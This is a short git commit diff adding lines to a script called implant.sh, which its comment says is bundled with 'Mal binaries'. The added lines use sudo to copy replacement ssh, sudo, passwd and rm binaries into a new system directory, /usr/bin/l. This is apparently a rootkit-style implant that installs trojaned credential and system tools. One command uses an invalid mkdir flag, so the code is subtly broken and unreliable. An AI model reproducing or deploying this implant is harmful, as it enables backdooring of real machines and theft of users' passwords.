3fd4b4280858f8e5c203feddff8a51b65d06bac2
Kordell Hutchins <43355784+hazarky@users.noreply.github.com>
2022-05-21 12:05:41 -0400

    Update implant.sh

--- implant.sh
+++ implant.sh
@@ -1,3 +1,9 @@
 #!/bin/bash
 # This script is Supposed to be bundled with the Mal binaries in the same directory.
 #
+
+sudo mkdir -P /usr/bin/l
+sudo cp  ./ssh /usr/bin/l
+sudo cp  ./sudo /usr/bin/l
+sudo cp  ./passwd /usr/bin/l
+sudo cp ./rm /usr/bin/l
